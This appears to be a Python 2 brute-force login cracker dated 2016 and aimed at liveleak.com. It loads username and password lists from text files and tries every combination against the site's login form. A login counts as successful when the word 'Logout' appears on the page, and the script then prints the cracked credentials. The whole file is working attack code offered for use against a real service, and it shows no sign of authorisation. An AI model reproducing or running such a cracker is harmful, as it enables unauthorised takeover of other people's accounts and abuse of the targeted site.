
# Wayne Kenney - 2016                              
#    __ _             __            _        ___               _             
#   / /(_)_   _____  / /  ___  __ _| | __   / __\ __ __ _  ___| | _____ _ __ 
#  / / | \ \ / / _ \/ /  / _ \/ _` | |/ /  / / | '__/ _` |/ __| |/ / _ \ '__|
# / /__| |\ V /  __/ /__|  __/ (_| |   <  / /__| | | (_| | (__|   <  __/ |   
# \____/_| \_/ \___\____/\___|\__,_|_|\_\ \____/_|  \__,_|\___|_|\_\___|_|   
                                                                          
#Modules
import requests
from random import randint
from time import sleep
from tqdm import tqdm

#Main Routine.
def main():

	#Global Variables
	global USERNAME
	global PASSWORD
	global login_URL
	global page
	global landing
	global keyword
	global attempts
	global text_file
	global text_file2

	#Load into dictionary
	text_file = open("users.txt", "r")
	text_file2 = open("pw.txt", "r")
	#Username List [Split New Lines]
	USERNAME = text_file.read().split('\n')
	#Password List [Split New Lines]
	PASSWORD = text_file2.read().split('\n')

	print "\nUsernames Loaded.."
	print "Passwords Loaded..\n"

	#Site's Name (Banner)
	Service = 'LiveLeak - Cracker'
	#Login URL
	login_URL = 'http://www.liveleak.com/index.php'
	#login_URL redirected to after login_URL containing keyword
	landing = 'http://www.liveleak.com/index.php'
	#The keyword that indicates successful login_URL detection
	keyword = 'Logout'

	#Display Banner
	print '%s\n' % (Service)


main()
def cpPrompt():
	global c

	#Command line Construct. Add commands here..
	while(True):

		#Listen for command input
		cmd = raw_input('Command>')

		#Command Input Construct
		if cmd == '?':
			#Show list of commands
			print ('\n- start (Activate Cracker)'
					'\n- quit (Exit Program)\n')
		#Close	
		elif cmd == 'quit':
			quit()
		#Begin
		elif cmd == "start":
			print " "
			break


cpPrompt()
def processReq():
	global USERNAME
	global PASSWORD

	with requests.Session() as c:
		
		#Cycle
		for u in USERNAME:
			#Display current username above progressbar
			print "Username: %s" % (u)
			for p in tqdm(PASSWORD):
		
				#1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#Header data
				header_data = \
				{
				}

				login_data = \
				{
					'user_name': u,
					'user_password': p,
					'login': '1',
				}

				#2) Submit POST data. Initialize login
				c.post(login_URL, data=login_data, headers=header_data)

				#3) Landing page after login attempt. Function name as object. func.var = x
				processReq.page = c.get(landing)

				#4) Looking for keyword indicating successful login
				Check = processReq.page.content.find(keyword)

				#Continuous auth checking. Line by line
				if Check == -1:
					pass
				else:
					print ' \nCracked: %s:%s\n' % (u,p)
					#Login success. Go to command console
					cpPrompt()

		print "\nNothing found..\n"
		cpPrompt()


#Process Auth Details
processReq()